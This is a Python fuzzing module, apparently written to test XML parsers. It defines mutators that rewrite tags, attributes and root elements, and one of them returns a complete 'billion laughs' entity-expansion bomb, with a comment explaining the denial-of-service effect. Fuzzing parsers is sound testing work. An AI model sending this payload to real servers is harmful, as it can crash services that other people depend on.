import sys
from mutator_base import BaseMutator
import numpy as np

# https://docs.python.org/3/library/xml.etree.elementtree.html
import xml.etree.ElementTree as ET

# xml bomb
'''
external xml bomb, inside the actual message being sent,
or a xml attachment
Overloads an XML Parser (typicall HTTP server).
exploits xml allowing defining entities.
    E.g. Let 'entityOne' be defines as 20 'entityTwo's', with entityTwo being defined as
        20 entityThree's, and so on. If continued until entityEight, the XML parser will unfold
        a single occurrance of entityOne to 1 280 000 000 entityEights (*Gb), causing DOS.
'''
# XML Root Tag
''' each xml has exactly one 'root element', enclosing all other elements, thus being the parent (ROOT).'''


class xmlOverFlowMutator(BaseMutator):
    def get_mutation(self, text: bytes, input: np.ndarray) -> bytes:
        number = 2
        xmlTemplate="""
        {tag1}
            {input1}
            {input2}
        {tag2}
        """
        return xmlTemplate.format(tag1=("<tag>"*number), input1=("<input>" * number), input2=("</input>" * number), tag2=("</tag>" * number))

    def get_dimension(self) -> "int":
                return 0 # ???

class xmlBombMutator(BaseMutator):
    def get_mutation(self):
        return  """
        <?xml version="1.0"?>
        <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        <!ENTITY lolz "&lol9;">
        ]>
        <root>&lolz;</root>
        """

    def get_dimension(self) -> "int":
            return 0 # ???










# class RepeatMutator(BaseMutator):
#     def get_mutation(self, text: bytes, input: npgettext.ndarray) -> bytes:
#         return 0


class AttributeMutator():
    def get_mutation(self, text: bytes, input: np.ndarray) -> bytes:
        return AttributeMutator.changeAttributes(text, str(input[0].tobytes()[2:4]))

    # Changes all of the attributes for all tags in the xml
    def changeAttributes(sample_text, attribute_change):
        tree = ET.fromstring(sample_text)

        for element in tree.iter():
            element.attrib = {"": attribute_change}

        return ET.tostring(tree)

    # Changes the attribute for all 'href' in the xml
    def changeHREFAttribute(sample_text, attribute_change):
        tree = ET.fromstring(sample_text)

        for element in tree.iter():
            if 'href' in element.attrib:
                print(element.attrib)
                element.attrib['href'] = attribute_change

        return ET.tostring(tree)
    
    def get_dimension(self) -> "int":
        return 0 # ???




class TagMutator():
    def get_mutation(self, text: bytes, input: np.ndarray) -> bytes:
        return TagMutator.changeTags(text, str(input[0].tobytes()[2:4]))

    # Returns a list of all tags in the xml file.
    def get_XMLTags(sample_text):
        xmlTree = ET.fromstring(sample_text)
        tags_list = []
        for tag in xmlTree.iter():
            tags_list.append(tag)

        return tags_list
    
    # Goes through the file and modifies all of the tags in the file, except for the root (html) tag.
    def changeTags(sample_text, tag_change) -> bytes:
        tree = ET.fromstring(sample_text)
        tags_list = TagMutator.get_XMLTags(sample_text)
        for tag in tags_list:
            for elem in tree.findall(tag.tag):
                elem.tag = tag_change
        print(ET.tostring(tree))
        return ET.tostring(tree)

    def get_dimension(self) -> "int":
        return 0 # ???



class RootTagMutator(BaseMutator):
    def get_mutation(self, text: bytes, input: np.ndarray) -> bytes:
        root = RootTagMutator.get_RootTag(text)
        tree = ET.fromstring(text)
        for elem in tree.iter():
            if elem.tag == root.tag:
                elem.tag = str(input[0].tobytes()[2:4])

        return ET.tostring(tree)

    #returns the root tag.
    def get_RootTag(sample_text):
        tree = ET.ElementTree(ET.fromstring(sample_text))
        root = tree.getroot()
        return root

# def main():
#     file = sys.argv[1]
#     with open(file, "rb") as f:
#         sample_text = f.read()

#     array = np.random.rand(10)
#     print(TagMutator.get_mutation(TagMutator, sample_text, array))


# if __name__ == "__main__":
#     main()